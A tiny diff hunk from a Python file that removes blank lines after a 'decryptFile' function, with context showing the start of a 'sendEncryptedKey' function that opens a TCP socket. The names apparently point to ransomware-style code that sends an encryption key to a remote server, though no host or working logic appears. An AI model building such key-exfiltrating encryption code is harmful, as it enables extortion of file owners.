@@ -24,8 +24,6 @@ def decryptFile(file_path):
 
     with open(file_path, 'wb') as file:
         file.write(decrypted_data)
-    
-
 
 def sendEncryptedKey(ekey_path):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
